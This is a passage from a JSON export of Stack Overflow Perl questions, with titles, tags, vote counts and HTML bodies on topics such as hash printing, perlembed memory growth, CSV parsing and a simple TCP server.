machine.</p>\n"},{"tags":["string","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13210925,"title":"In perl create a multiline String without explicitely concatinating and without \\n","body":"<p>I need to write down a complicated MySQL query in perl.\nI want to structure it in multiple lines.</p>\n\n<p>Unfortunately,when using EOF notation perl inserts \\n into my string.\nIs there a way to write down a String in multiple lines, so that perl wont insert \\n in it?\nI eithr do not want to explicetly concat each line by a +.</p>\n"},{"tags":["perl","module-build"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":13188343,"title":"How do I ensure that old shared content is removed when using Module::Build's share_dir option?","body":"<p>I'm using <code>Module::Build</code>'s <code>share_dir</code> option to install read-only supplementary content when users install my Perl module.</p>\n\n<p>How do I ensure that the old content added by previous versions of my module is deleted when a new version of my module is installed?</p>\n\n<p>Thanks in advance for your help.</p>\n"},{"tags":["perl","ioctl"],"answer_count":7,"favorite_count":1,"up_vote_count":15,"down_vote_count":0,"view_count":22769,"score":15,"question_id":1605195,"title":"\"inappropriate ioctl for device\"","body":"<p>I have a perl script running in a aix box. </p>\n\n<p>The script tries to open a file from a certain directory and it fails to read the file because file has no read permission.\nbut i get a different error saying \"inappropriate ioctl for device\" \nShouldn't it say something like file doesn't have read permission or something?</p>\n\n<p>What does this \"\"inappropriate ioctl for device\"  message mean?\nHow can I fix it?</p>\n\n<p>EDIT: This is what I found when I did <code>strace</code>.</p>\n\n<pre>\nopen(\"/local/logs/xxx/xxxxServer.log\", O_WRONLY|O_CREAT|O_APPEND|O_LARGEFILE, \n    0666) = 4 _llseek(4, 0, [77146], SEEK_END) = 0\nioctl(4, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffc14f8) = -1 ENOTTY \n    (Inappropriate ioctl for  device)\n</pre>\n"},{"tags":["perl","perl-data-structures","template-toolkit"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":13200595,"title":"List of paths into hash array tree in Perl","body":"<p>I got an array of paths</p>\n\n<pre><code>C:\\A\nC:\\B\\C\nD:\\AB\n</code></pre>\n\n<p>and I'd like to have these in a hash array tree so I can go through them in a TT2 template.</p>\n\n<p>What I mean is like this:</p>\n\n<pre><code>@dirs = [\n          {\n            name =&gt; \"C:\",\n            subs =&gt; [\n                      {\n                        name =&gt; \"A\",\n                        subs =&gt; [],\n                      },\n                      {\n                        name =&gt; \"B\",\n                        subs =&gt; [\n                                  {\n                                    name =&gt; \"C\",\n                                    subs =&gt; [],\n                                  }\n                                ],\n                      }\n                    ]\n          },\n          { \n            name =&gt; \"D:\",\n            subs =&gt; [\n                      {\n                        name =&gt; \"AB\",\n                        subs =&gt; [],\n                      }\n                    ],\n          }\n        ]\n</code></pre>\n\n<p>I also know that I'm probably doing brainderp here so I'm open to other approaches, only requirement is turning that list of paths into something you can rebuild as a tree with the TT2 Template Toolkit.</p>\n\n<p>Also what's that structure called? I just thought of hash array tree but I bet that's wrong.</p>\n"},{"tags":["perl","subroutine"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":13205431,"title":"Beginner - Subroutine confusion","body":"<p>I'm a beginner and confused about what's happening inside this Perl subroutine.</p>\n\n<p>I'm using only global variables to simplify things, but it's still not working.</p>\n\n<p>I'm simply trying to print a file's read, write and executable attributes using the file test operators with IF statements.</p>\n\n<p>Can anyone point out the problem for me?</p>\n\n<p>Louie</p>\n\n<pre><code>sub getfileattributes {\n    if (-r $file) {\n        $attributes[0] = \"readable\";\n    } else { $attributes[0] = \"not readable\"; }\n    if (-w _) {\n        $attributes[1] = \"writable\";\n    } else { $attributes[1] = \"not writable\"; }\n    if (-x _) {\n        $attributes[2] = \"executable\";\n    } else { $attributes[2] = \"not executable\"; }\n}    \n\nmy @attributes;\nmy $file;\n\nforeach $file (@ARGV) {\n    &amp;getfileattributes;\n    printf \"The file $file is %s, %s and %s\\n\", @attributes;\n}\n</code></pre>\n"},{"tags":["perl","hash","printing"],"answer_count":10,"favorite_count":3,"up_vote_count":13,"down_vote_count":0,"view_count":10287,"score":13,"question_id":1162245,"title":"How can I print the contents of a hash in Perl?","body":"<p>I keep printing my hash as # of buckets / # allocated.\nHow do I print the contents of my hash? Without using a while loop would be most preferable (ex: a one-line would be best)</p>\n"},{"tags":["perl","unicode","internationalization","pod","man"],"answer_count":2,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":102,"score":7,"question_id":13065495,"title":"How can I use Unicode characters in Perl POD-derived man pages?","body":"<p>And if this isn't possible, what is the best practice for dealing with man pages derived from UTF-8-encoded POD?</p>\n\n<p>The first thing to do in order to work with Unicode in POD is to use the directive</p>\n\n<pre><code>=encoding UTF-8\n</code></pre>\n\n<p>(as discussed <a href=\"http://stackoverflow.com/questions/207871/how-do-i-use-unicode-characters-in-pod-and-perldoc\">here</a>). The <code>pod2text</code> and <code>pod2html</code> tools will work fine and produce perfect UTF-8-encoded output.</p>\n\n<p>The <code>pod2man</code> tool, however, does not:</p>\n\n<pre><code>pod2man -u MyModule.pm | nroff -Tutf8 -man | less\n</code></pre>\n\n<p>Neither does <code>perldoc</code>. Non-ASCII characters are all mangled or X-ed out. There is <a href=\"https://rt.perl.org/rt3//Public/Bug/Display.html?id=111448\">some inconclusive discussion</a> on perlbug on whether this might be a bug in <code>pod2man</code> or *<em>roff</em>.</p>\n\n<p>Since my module deals with Unicode specifically and is intended for distribution on CPAN, Unicode-enabled man pages are a must.</p>\n\n<p>I am using Perl 5.14.2, perldoc 3.15, and *roff 1.21.</p>\n"},{"tags":["perl","testing","dbix-class"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13206400,"title":"What does a schema.conf for Test::DBIx::Class look like?","body":"<p>The SYNOPSIS for <a href=\"https://metacpan.org/module/Test%3a%3aDBIx%3a%3aClass\" rel=\"nofollow\">Test::DBIx::Class</a> states:</p>\n\n<blockquote>\n  <p>Yes, it looks like a lot of boilerplate, but sensible defaults are in place \n  (the above code example shows most of the existing defaults) and \n  configuration data can be loaded from a central file. So your 'real life' \n  example is going to look closer to (assuming you put all your test \n  configuration in the standard place, \"t/etc/schema.conf\":</p>\n</blockquote>\n\n<p>Other than this, I can't seem to find a reference to t/etc/schema.conf or even an example of what it might look like.  What am I missing?</p>\n"},{"tags":["c#","perl"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":6,"view_count":70,"score":-5,"question_id":13207649,"title":"Convert this small syntax code from perl to c#","body":"<p>Can someone please help me to translate/convert the following code from Perl to C#?</p>\n\n<pre><code>$soap-&gt;proxy('http://localhost/Webservice/InfoService.asmx', \nkeep_alive =&gt; 1, cookie_jar =&gt; \n</code></pre>\n\n<p>I need it to get a proxy from a WebService. In Perl it works, but I can't seem to make it work in C#...</p>\n\n<p>Any help will be appreciated!</p>\n\n<p>For more details see: <a href=\"http://stackoverflow.com/questions/13207057/unable-to-get-cookie-from-webservice\">Unable to get cookie from webservice</a></p>\n"},{"tags":["mysql","perl","dbd"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":434,"score":1,"question_id":8195379,"title":"missing mysql_config error while installing DBD::mysql","body":"<p>I saw <a href=\"http://stackoverflow.com/questions/4729722/trying-to-install-perl-mysql-dbd-mysql-config-cant-be-found/4729876#4729876\">Trying to install Perl-Mysql DBD, mysql_config can&#39;t be found</a>, and tried to locate mysql_config, but didn't find it. So, I tried to install mysql-devel, and then I get this error-</p>\n\n<pre><code>[nbezzala@stats /]$ sudo yum install mysql-devel  \n[sudo] password for nbezzala: \nLoaded plugins: fastestmirror  \nLoading mirror speeds from cached hostfile  \n * base: mirrors.cmich.edu  \n * extras: holmes.umflint.edu  \n * updates: mirror.symnds.com  \nSetting up Install Process  \nResolving Dependencies  \n--&gt; Running transaction check  \n---&gt; Package mysql-devel.i386 0:5.0.77-4.el5_6.6 set to be updated  \n--&gt; Processing Dependency: libmysqlclient.so.15 for package: mysql-devel  \n--&gt; Processing Dependency: libmysqlclient_r.so.15 for package: mysql-devel  \n---&gt; Package mysql-devel.x86_64 0:5.0.77-4.el5_6.6 set to be updated  \n--&gt; Running transaction check  \n---&gt; Package mysql.i386 0:5.0.77-4.el5_6.6 set to be updated  \n--&gt; Processing Conflict: mysql conflicts MySQL  \n--&gt; Finished Dependency Resolution  \nmysql-5.0.77-4.el5_6.6.i386 from base has depsolving problems  \n  --&gt; mysql conflicts with MySQL-server  \nError: mysql conflicts with MySQL-server  \n You could try using --skip-broken to work around the problem  \n You could try running: package-cleanup --problems  \n                        package-cleanup --dupes  \n                        rpm -Va --nofiles --nodigest  \nThe program package-cleanup is found in the yum-utils package.  \n[nbezzala@stats /]$  \n</code></pre>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":63,"score":-2,"question_id":13206053,"title":"Script run only one month","body":"<p>I'm wirting some perl script and I try to run for only one month. Is it posible or Not?</p>\n\n<p>I try this:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse File::Pid;\n\nmy $pidfile = File::Pid-&gt;new({file =&gt; 'sample.pl'});\nexit if $pidfile-&gt;running();\n\n$pidfile-&gt;write();\n\n# ... rest of script...\n\n# end of script\n$pidfile-&gt;remove();\nexit;\n</code></pre>\n\n<p>This script will run only one time and for second time you willn't run this script becuase it will remove automatically. </p>\n\n<p>I need perl script run only one month and after one month I will update for next month. Is it posible or Not?</p>\n"},{"tags":["perl","tcp","receive","respond"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":80,"score":1,"question_id":13168485,"title":"TCP Server multiple receive and respond","body":"<p>Im trying to emulate a TCP Server on the same PC where the app is running.\nI dont know if it can be done in Perl because im not very experienced.</p>\n\n<p>With the code bellow the first reply is working but i dont know how to implement the second.</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse IO::Socket::INET;\nuse strict;\n\n\nmy $socket = IO::Socket::INET-&gt;new('LocalPort' =&gt; '3000',\n                   'Proto' =&gt; 'tcp',\n                   'Listen' =&gt; SOMAXCONN)\n    or die \"Can't create socket ($!)\\n\";\nprint \"Server listening\\n\";\nwhile (my $client = $socket-&gt;accept) {\n    my $name = gethostbyaddr($client-&gt;peeraddr, AF_INET);\n    my $port = $client-&gt;peerport;\n    while (&lt;$client&gt;) {\n    print \"$_\";\n    print $client \"RESPONSE1\";\n    }\n    close $client\n    or die \"Can't close ($!)\\n\";\n}\ndie \"Can't accept socket ($!)\\n\";\n</code></pre>\n\n<p>EDIT: Thank you guys for the imput, i ended up with php done it and its working, yay!</p>\n"},{"tags":["perl","unicode","hex"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":13174068,"title":"How to convert Hex to String in perl?","body":"<p>I am using Perl</p>\n\n<p>I got a string </p>\n\n<blockquote>\n  <p>agn\\u00e8s b</p>\n</blockquote>\n\n<p>How can I convert it to </p>\n\n<blockquote>\n  <p>agnÃ¨s b</p>\n</blockquote>\n\n<p>I have tried to use below code</p>\n\n<pre><code>my $hex = \"agn\\u00e8s b\";\n$hex =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack(\"C\",hex($1))/eg;\nprint \"$hex\\n\";\n</code></pre>\n\n<p>But it failed and display some strange character. What is more, I need to display Chinese word as well. For example,</p>\n\n<blockquote>\n  <p>\\u9eb5\\u5305</p>\n</blockquote>\n\n<p>How to convert to </p>\n\n<blockquote>\n  <p>éºµå</p>\n</blockquote>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13205671,"title":"Possible to detect hash with more than one key?","body":"<p>I am collecting data in a hash of hashes which looks like</p>\n\n<pre><code>$VAR1 = {\n          '502' =&gt; {\n                     'user2' =&gt; '0'\n                   },\n          '501' =&gt; {\n                     'git' =&gt; '0',\n                     'fffff' =&gt; '755'\n                   },\n          '19197' =&gt; {\n                       'user4' =&gt; '755'\n                     }\n        };\n</code></pre>\n\n<p>The problem is in <code>501</code>. Two keys may not occur. Is it possible to detect this?</p>\n\n<p><strong>Update</strong>\nFixed typo in hash.</p>\n"},{"tags":["c","perl","xs"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13169768,"title":"perlembed/perlcall example unbounded memory growth - valgrind says no leaks possible","body":"<p>all. I've been banging my head up against this one for a while... I'm trying to put together an example of basically perlembed + perlcall and more or less \"borrowed\" it from evpsgi. The problem is that it grows about 1MB in size for every 1000 iterations. This isn't the greatest situation to be in when running in a long lived process (which is the use case that I'm working with).</p>\n\n<p>As the title states, if I run with valgrind it reports that there are no leaks possible. I ran with --trace-malloc=yes and it appears that free is only ever called at the end in a big batch of calls. I understand that this may be perl's MO but it would be nice if it at least re-used the memory and didn't grow until the OS killed off the process.</p>\n\n<p>The entry for sv_2mortal mentions something about the buffer being available to be \"stolen\" but I've peppered the code with calls to sv_2mortal but there was no change.</p>\n\n<p>Without further ado, here is the code. Please forgive the cargo cultishness of it. Thanks in advance!</p>\n\n<pre><code>/*\n *\n * cc `perl -MExtUtils::Embed -e ccopts -e ldopts` -Wall -ggdb test_perl_2.c -o test_perl_2\n *\n * # test.psgi\n * use strict;\n * use warnings;\n * my $app = sub  {\n *     return [ 200, [ test =&gt; 1 ], [ sprintf( \"%d: Hello!!! from %s\\n\", $$, __FILE__ ) ] ];\n * };\n *\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;EXTERN.h&gt;               /* from the Perl distribution     */\n#include &lt;perl.h&gt;                 /* from the Perl distribution     */\n\nstatic PerlInterpreter *perlinterp;  /***    The Perl interpreter    ***/\nstatic SV *app;\n\nvoid do_stuff( void );\nSV * get_stuff( void );\nSV * call_stuff( SV * );\n\nEXTERN_C void xs_init( pTHX );\nEXTERN_C void boot_DynaLoader (pTHX_ CV* cv);\nEXTERN_C void xs_init( pTHX ) {\n    char *file = __FILE__;\n    dXSUB_SYS;\n    /* DynaLoader is a special case */\n    newXS(\"DynaLoader::boot_DynaLoader\", boot_DynaLoader, file);\n}\n\nint main( int argc, char **argv, char **env ) {\n    char code[ 1024 ];\n    char psgi[] = \"test.psgi\";\n    char *embedding[] = { \"\", \"-e\", \"0\" };\n\n    PERL_SYS_INIT3( &amp;argc, &amp;argv, &amp;env );\n    perlinterp = perl_alloc();\n    PERL_SET_CONTEXT( perlinterp );\n    perl_construct( perlinterp );\n    perl_parse( perlinterp, xs_init, 3, embedding, (char **)NULL );\n    PL_exit_flags |= PERL_EXIT_DESTRUCT_END;\n\n    sprintf( code, \"do '%s' or die $@\", psgi );\n    app = eval_pv( code, TRUE ); /* croak_on_error */\n\n    do_stuff();\n\n    PL_perl_destruct_level = 1;\n    perl_destruct( perlinterp );\n    perl_free( perlinterp );\n    PERL_SYS_TERM();\n    return 0;\n}\n\nvoid do_stuff( void ) {\n    int body_lastindex, i, count;\n    AV *response_av, *body_av;\n    SV *stuff_sv, *response_sv, *status, *tmp_body_sv, *body_sv;\n\n//  count = 10000;\n    count = 10;\n    while( count-- ) {\n\n        ENTER;\n        SAVETMPS;\n\n        stuff_sv = get_stuff();\n        response_sv = call_stuff( stuff_sv );\n\n        if(\n            NULL == response_sv ||\n            ! SvROK( response_sv ) ||\n            SvTYPE( SvRV( response_sv ) ) != SVt_PVAV\n        ) {\n            printf( \"NULL == response_sv\\n\" );\n            goto CLIENT_END;\n        }\n\n        response_av = (AV *)SvRV( response_sv );\n\n        status = *av_fetch( response_av, 0, 0 );\n        printf( \"status = %ld\\n\", (long)SvIV( status ) );\n\n        body_av = (AV *)SvRV( *av_fetch( response_av, 2, 0 ) );\n\n        body_sv = newSV( 0 );\n\n        body_lastindex = av_len( body_av );\n        for( i = 0; i &lt;= body_lastindex; i++ ) {\n            tmp_body_sv = (SV *)*av_fetch( body_av, i, 0 );\n            if( SvOK( tmp_body_sv ) ) {\n                sv_catsv( body_sv, tmp_body_sv );\n            }\n        }\n        printf( \"body_sv = %s\\n\", SvPV_nolen( body_sv ) );\n\nCLIENT_END:\n        FREETMPS;\n        LEAVE;\n    }\n}\n\nSV * get_stuff( void ) {\n    HV *stuff_hv;\n//    stuff_hv = (HV *)sv_2mortal((SV *)newHV());\n    stuff_hv = newHV();\n\n    if( NULL == hv_store( stuff_hv, \"SCRIPT_NAME\", strlen( \"SCRIPT_NAME\" ), newSVpv( \"\", 0 ), 0 ) ) {\n        croak( \"hv_store( 'SCRIPT_NAME' )\" );\n    }\n\n    if( NULL == hv_store( stuff_hv, \"REQUEST_METHOD\", strlen( \"REQUEST_METHOD\" ), newSVpv( \"GET\", 3 ), 0 ) ) {\n        croak( \"hv_store( 'REQUEST_METHOD' )\" );\n    }\n\n    if( NULL == hv_store( stuff_hv, \"REQUEST_URI\", strlen( \"REQUEST_URI\" ), newSVpv( \"/abc?def\", 8 ), 0 ) ) {\n        croak( \"hv_store( 'REQUEST_URI' )\" );\n    }\n\n    if( NULL == hv_store( stuff_hv, \"PATH_INFO\", strlen( \"PATH_INFO\" ), newSVpv( \"/abc\", 4 ), 0 ) ) {\n        croak( \"hv_store( 'PATH_INFO' )\" );\n    }\n\n    if( NULL == hv_store( stuff_hv, \"QUERY_STRING\", strlen( \"QUERY_STRING\" ), newSVpv( \"def\", 3 ), 0 ) ) {\n        croak( \"hv_store( 'QUERY_STRING' )\" );\n    }\n\n    return newRV_inc( (SV *)stuff_hv );\n}\n\nSV * call_stuff( SV *stuff_sv ) {\n    SV *response_sv;\n    int count;\n\n//  printf( \"REQUEST_URI = %s\\n\", SvPV_nolen( *hv_fetch( (HV *)SvRV( stuff_sv ), \"REQUEST_URI\", strlen( \"REQUEST_URI\" ), 0 ) ) );\n\n    dSP;\n    ENTER;\n    SAVETMPS;\n    PUSHMARK( SP );\n    XPUSHs( stuff_sv ); // stuff_sv is not mortal.\n    PUTBACK;\n    count = call_sv( app, G_EVAL | G_SCALAR | G_KEEPERR );\n    SPAGAIN;\n    if( SvTRUE( ERRSV ) ) {\n        response_sv = NULL;\n        fprintf( stderr, \"FATAL: %s\", SvPV_nolen( ERRSV ) );\n        /* CLEAR_ERRSV() is only available 5.8.9 or later */\n        if( SvMAGICAL( ERRSV ) ) {\n            mg_free( ERRSV );\n            mg_clear( ERRSV );\n        }\n        sv_setpvn_mg( ERRSV, \"\", 0 );\n        POPs; // causes \"warning: value computed is not used\"\n    }\n    else if( count &gt; 0 ) {\n        response_sv = POPs; // is this mortal?\n        SvREFCNT_inc( response_sv );\n    } else {\n        response_sv = NULL;\n    }\n\n    PUTBACK;\n    FREETMPS;\n    LEAVE;\n    return response_sv;\n}\n</code></pre>\n"},{"tags":["perl","set"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":261,"score":1,"question_id":5396415,"title":"How to group N items?","body":"<p>I am working on a set partitioning problem and need a way to define all combinations of unordered bucket sizes. Given N elements and exactly M groups, find every combination of group sizes such that the sum of the group sizes is N.  Note:  The size of the bucket cannot be 0. </p>\n\n<p>For example, assume 6 items need to be placed in 3 buckets.   The solution I'm looking for is:</p>\n\n<pre><code>([1,2,3],[1,1,4],[2,2,2])\n</code></pre>\n\n<p>To map these equally, I use a map function as follows:</p>\n\n<pre><code>@grouping = map { int( ($items + $_) / $groups ) } 0 .. $groups-1;\n</code></pre>\n\n<p>To get all combinations I'm thinking some kind of recursive function where each level of recursion N finds the possible values for element N in the array.   The eligible values each level can insert is >= previousLevel.  This is sort of what I'm thinking but there has got to be a better way to do this....</p>\n\n<pre><code>sub getList($$@){\n    my $itemCount = shift;\n    my $groupCount = shift;\n    my @currentArray = @_;\n    my $positionToFill= @currentArray;\n    if($positionToFill == 0){\n        my $minValue = 1;\n    }\n    else{\n        my $minValue = currentArray[$positionToFill-1];\n    }\n    my $currentSum = sum(@currentArray);\n    return undef if $currentSum + $minValue &gt;= $items;\n\n    my @possibleCombinations = ();\n    for(my $i = $minValue; $i &lt; $items - $currentSum; $i++){\n        $currentArray[$positionToFill] = $i;\n        if($positionToFill == $groupCount-1){\n            push(@possibleCombinations, \\@currentArray)\n        }\n        else{\n            push(@possibleCombinations, getList($itemCount, $groupCount, @currentArray);\n        }                        \n    }\n    return @currentArray;\n}\n</code></pre>\n"},{"tags":["perl","parsing","csv"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":95,"score":2,"question_id":13088923,"title":"Parse CSV cell by cell","body":"<p>I'm learning Perl and I have a challenge to do in Bioinformatics.</p>\n\n<p>I have a CSV file with a lot of columns and rows... but I need to sum cells of certain column:</p>\n\n<pre><code>Samples | Name | Value1 | Value2 | Value3\n\nA-Sample | A-Name | 1 | 32 | 27 | 21\n\nB-Sample | B-Name | 2 | 23 | 12 | 13\n\nC-Sample | C-Name | 3 | 10 | 98 | 59\n\nD-Sample | D-Name | 4 | 21 | 78 | 72\n\nE-Sample | E-Name | 5 | 32 | 72 | 27\n</code></pre>\n\n<p>So I need Sum of cells in column Value 1, Sum of cells in column Value2... The \"|\" was just to exemplify. </p>\n\n<p>I know this is basic and I'm studying as hard as I can. I'm trying to use Text::CSV, but I only get the result as lines.</p>\n\n<p>Could anyone help me?</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","mechanize","www-mechanize"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":11,"view_count":87,"score":-11,"question_id":13203311,"title":"I need a perl script based on Mechanize","body":"<p>I need a script that will automatically post a comment on a blog, in fact a list of blogs, can someone help me pls? It must be based on this form. Thank you for your time!</p>\n\n<pre><code>&lt;form action=\"http://www.website.com/wp-comments-post.php\" method=\"post\" id=\"commentform\"&gt;\n\n\n&lt;p&gt;&lt;input type=\"text\" name=\"author\" id=\"author\" value=\"\" size=\"22\" tabindex=\"1\"&gt;\n&lt;label for=\"author\"&gt;&lt;small&gt;&lt;/small&gt;&lt;/label&gt;&lt;/p&gt;\n\n&lt;p&gt;&lt;input type=\"text\" name=\"email\" id=\"email\" value=\"\" size=\"22\" tabindex=\"2\"&gt;\n&lt;label for=\"email\"&gt;&lt;small&gt;&lt;/small&gt;&lt;/label&gt;&lt;/p&gt;\n\n&lt;p&gt;&lt;input type=\"text\" name=\"url\" id=\"url\" value=\"\" size=\"22\" tabindex=\"3\"&gt;\n&lt;label for=\"url\"&gt;&lt;small&gt;URL&lt;/small&gt;&lt;/label&gt;&lt;/p&gt;\n\n\n&lt;p&gt;&lt;textarea name=\"comment\" id=\"comment\" cols=\"60\" rows=\"10\" tabindex=\"4\"&gt;&lt;/textarea&gt;&lt;/p&gt;\n\n&lt;p&gt;&lt;input name=\"submit\" type=\"submit\" id=\"submit\" tabindex=\"5\" value=\"\"&gt;\n&lt;input type=\"hidden\" name=\"comment_post_ID\" value=\"66\"&gt;\n&lt;/p&gt;\n\n&lt;/form&gt;\n</code></pre>\n"},{"tags":["perl","debugging","watch"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13196351,"title":"How can I create a watch expression for a piece of code in the Perl debugger?","body":"<p>I'm debugging a huge legacy Perl program. I know that it does something I do not want, but I don't know where in the code that is. Stepping through it with the debugger is kind of exhausting, so I'd like to add a watch expression.</p>\n\n<p>Now I wonder, if I can add watches for variables as well as expressions, is it possible to tell it to simply parse each command and stop if a certain piece of text is in that command?</p>\n\n<p>Something like <code>w m/bad command/</code> where <code>$_</code> is the next command that is being executed.</p>\n\n<p>I'm working with Komodo on Windows doing remote CGI debugging right now, but I can also use <code>perl -d</code> on a linux shell.</p>\n\n<hr>\n\n<p><strong>Update</strong>:</p>\n\n<p>I'll try to make this clearer. There's a file with data on disk being deleted, and I don't know where. The program I'm debugging consists of a lot of .pl files being required into each other, and the complete codebase is even larger. I could of course grep through this for either the part of the data files' name (I know the extension), or for <code>unlink</code>. But since I don't know which code files are being used by my program, that does not get me very far.</p>\n\n<p>Let's consider this piece of code, which is going to be debugged:</p>\n\n<pre><code>if ($foo == 1) {\n  unlink 'filename.example';\n}\n</code></pre>\n\n<p>Now when I'm debugging this, I'd like the debugger to stop if the next perl command (from the script) which is about to be executed contains <code>/example/</code>. I want kind of a hook that is run before the execution of the next command.</p>\n\n<p>That way, I don't need to know <em>where</em> (as in which line or file) the thing I'd like to break at is, nor do I need a variable name (as there is none).</p>\n\n<p>I know this is weird to explain, but I thought it might be a common problem. Maybe there's another approach altogether?</p>\n"},{"tags":["perl","cygwin","clearcase"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":41,"score":3,"question_id":13186605,"title":"Updating comments of checkedin files in Clearcase with Perl Script","body":"<p>I want to update comments of checkedin files in Clearcase with Perl script.<br>\nThis script works fine if the comment I'm passing from command line doesn't contain spaces.<br>\nBut when I use comments with spaces, I run into error -<br>\nError: Pathname not found: \"C:/Views/view1/some_dir/test.c@@/main/dbg_test/1<br>\nFollowing is command line input to script  </p>\n\n<blockquote>\n  <blockquote>\n    <p>./appendcomments.pl dbg_test \"\\\"scr1234, Test Scr\\\"\"  </p>\n  </blockquote>\n</blockquote>\n\n<p>Here is my code.  </p>\n\n<pre><code>if ($#ARGV != 1 )\n{\n    print \"usage: addcomments.pl &lt;base branch&gt; &lt;comment&gt;\\n\";\n    print \"     For example addcomments.pl rel5.0 \\\"This is an example\\\"\\n\";\n    exit;\n}\n\nmy $base_branch =   $ARGV[0];\nmy $comment   =     $ARGV[1];\n\nmy ($output, @FILE_LIST, $file, $desr);\n\n@FILE_LIST = `cleartool find -avobs -version \"version(.../$base_branch/LATEST)\" -print`;\n\nFILE: foreach $file (@FILE_LIST) \n{\n    $file =~ s/\\\\/\\//g;\n    $desr =`cleartool describe -fmt %Nc $file`;\n\n    if ($desr !~ /scr\\s*\\#*\\s*(\\d+)/img)\n    {\n        chomp($file);\n        $output = `cleartool chevent -c $comment -replace $file`; \n    }\n}\n</code></pre>\n"},{"tags":["string","perl","hash","dereference"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":77,"score":-1,"question_id":13202149,"title":"How do I print a hash in perl?","body":"<p>How do I print $stopwords? It seems to be a string ($) but when I print it I get: \"HASH(0x8B694)\" with the memory address changing on each run.</p>\n\n<p>I am using Lingua::StopWords and I simply want to print the stop words that it's using so I know for sure what stop words are there. I would like to print these two a file.</p>\n\n<p>Do I need to deference the $stopwords some how?</p>\n\n<p>Here is the code:</p>\n\n<pre><code>use Lingua::StopWords qw( getStopWords );\n\nopen(TEST, \"&gt;results_stopwords.txt\") or die(\"Unable to open requested file.\");\nmy $stopwords = getStopWords('en');\n\nprint $stopwords;\n</code></pre>\n\n<p>I've tried:</p>\n\n<pre><code>my @temp = $stopwords;\nprint \"@temp\";\n</code></pre>\n\n<p>But that doesn't work. Help!</p>\n\n<p>Last note: I know there is a list of stop words for Lingua::StopWords, but I am using the (en) and I just want to make absolute sure what stop words I am using, so that is why I want to print it and ideally I want to print it to a file which the file part I should already know how to do.</p>\n"},{"tags":["jquery","perl","mojolicious"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":38,"score":3,"question_id":13029948,"title":"jquery.get success function firing early with Hypnotoad and Mojolicious?","body":"<p>I had a quick question about some behaviour I'm seeing in hypnotoad vs Morbo.</p>\n\n<p>I have the following bit of jquery code which is triggered on an event.</p>\n\n<pre><code>alert('calling update device list');\n\n    $.get('updateDeviceList',\n\n            function (data) {\n\n                  alert('In update device list');\n\n                  $(\"div#devicelist\").html(data);\n\n             })\n</code></pre>\n\n<p>When I use Morbo the first alert displays, then once the result <code>data</code> from <code>updateDeviceList</code> is returned the second alert triggers and the <code>devicelist</code> div has its HTML replaced.</p>\n\n<p>However when I user hypnotoad the first alert triggers then the second alert triggers almost instantly.</p>\n\n<p>before `updateDeviceList' even finishes. Is that what it means by non-blocking?</p>\n\n<p>Is there a way I can get it to wait for my data to be returned first before proceeding?</p>\n\n<p>Many thanks.</p>\n"},{"tags":["html","perl","comparison"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13201460,"title":"Compare value from input element in Perl","body":"<p>I have a set of radio buttons that have the same name but different values.  I'm trying to get the value of the selected radio button and compare it to a preset value to see if they match.</p>\n\n<pre><code>&lt;input type=\"radio\" name=\"one\" value=\"a\"&gt;\n&lt;input type=\"radio\" name=\"one\" value=\"b\"&gt;\n&lt;input type=\"radio\" name=\"one\" value=\"c\"&gt;\n</code></pre>\n\n<p>Submitting this form...</p>\n\n<p><strong>EDIT</strong></p>\n\n<pre><code>@answers = (\"a\", \"a\", \"c\");\n\nfor $key (param()) {\n  $input {$key} = param($key);\n\n  if ($key ne \"firstName\" and $key ne \"lastName\") {\n    $value = \"$_\\n\" for $input{$key};\n\n    #The below values print out correctly.\n    #a a\n    #a a\n    #c c\n    print $value . \" \" . $answers[$i] . \"&lt;br/&gt;\";\n\n    #When trying to compare them nothing happens.\n    if ($value eq $answers[$i]) {\n      print \"TEST&lt;br/&gt;\";\n      $avg += 1;\n    }\n    $i++;\n  }\n}\n</code></pre>\n\n<p>So I need to push the value of the radio button into my array and then compare it to array answers.  </p>\n"},{"tags":["perl","cgi","cgi-bin"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":88,"score":0,"question_id":12666361,"title":"Unable to get this simple Perl CGI program running","body":"<p>Can someone please explain to me the very basics of getting perl to work on a server.  Do I need a module on the server?  If so where does it go?  What do I name my files and where do they go?  </p>\n\n<p>From my understanding you need a module and it goes in the 